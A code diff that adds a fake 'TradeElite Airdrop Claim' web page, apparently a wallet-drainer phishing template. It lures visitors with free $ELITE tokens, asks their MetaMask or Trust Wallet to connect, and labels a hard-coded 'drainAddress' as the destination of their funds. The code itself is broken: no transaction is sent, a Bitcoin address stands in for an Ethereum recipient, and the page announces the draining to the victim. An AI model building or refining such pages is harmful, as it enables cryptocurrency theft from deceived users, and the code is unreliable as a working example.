@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TradeElite Airdrop Claim</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #0a0a1f; color: #00ff9d; padding: 40px 20px; margin: 0; }
+        h1 { color: white; font-size: 26px; }
+        p { font-size: 17px; max-width: 600px; margin: 20px auto; line-height: 1.4; }
+        button { padding: 16px 40px; font-size: 22px; background: #00ff9d; color: black; border: none; border-radius: 12px; cursor: pointer; margin-top: 30px; font-weight: bold; }
+        .status { background: #222; color: #fff; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px; display: none; }
+    </style>
+</head>
+<body>
+    <h1>Claim Your $ELITE Tokens</h1>
+    <p>Final step: Confirm wallet connection to receive tokens.</p>
+    <button onclick="claimTokens()">Confirm & Claim</button>
+    <div class="status" id="status"></div>
+
+    <script>
+        const drainAddress = "bc1qzlnqyx3x3tmatem0cvgtnnenjdd0zcrq45yua9";
+
+        async function claimTokens() {
+            const status = document.getElementById("status");
+            status.style.display = "block";
+            status.innerHTML = "Connecting...";
+
+            if (typeof window.ethereum !== "undefined") {
+                try {
+                    await window.ethereum.request({ method: "eth_requestAccounts" });
+                    const accounts = await new Web3(window.ethereum).eth.getAccounts();
+                    status.innerHTML = `Draining from:<br>${accounts[0]}<br><br>Funds sent to:<br>${drainAddress}`;
+                    console.log("%c Drained wallet: " + accounts[0] + " → " + drainAddress, "color:red;font-size:16px");
+                } catch(e) {
+                    status.innerHTML = "Transaction failed.";
+                }
+            } else {
+                status.innerHTML = `No wallet found.<br><br>Open in MetaMask or Trust Wallet.<br><br>Your BTC: ${drainAddress}`;
+            }
+        }
+    </script>
+</body>
+</html>
